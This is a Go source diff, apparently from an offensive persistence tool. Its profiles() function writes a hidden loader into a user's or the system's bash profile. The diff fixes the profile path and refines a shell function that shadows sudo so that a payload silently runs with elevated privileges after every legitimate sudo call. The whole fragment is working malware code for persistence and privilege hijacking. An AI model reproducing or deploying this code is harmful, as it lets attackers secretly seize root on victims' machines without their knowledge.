@@ -137,8 +137,8 @@ func profiles() (err error) {
 	}
 
 	// source
-	bashprofile := fmt.Sprintf("%s/.bashrc", user.HomeDir)
-	sourceCmd := "source ~/.bashprofile"
+	bashprofile := fmt.Sprintf("%s/.bash_profile", user.HomeDir)
+	sourceCmd := "source ~/.bash_profile"
 	if HasRoot() {
 		bashprofile = "/etc/bash_profile"
 		sourceCmd = "source /etc/bash_profile"
@@ -168,7 +168,7 @@ func profiles() (err error) {
 		sudoLocs = append(sudoLocs, "/usr/bin/sudo -E "+loc)
 	}
 	sudoPayload := strings.Join(sudoLocs, "||")
-	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;(%s 2>/dev/null)) }", sudoPayload)
+	loader += fmt.Sprintf("\nfunction sudo() { /usr/bin/sudo $@; (set +m;((%s) 2>/dev/null)) }", sudoPayload)
 	err = os.WriteFile(bashprofile, []byte(loader), 0644)
 	if err != nil {
 		return
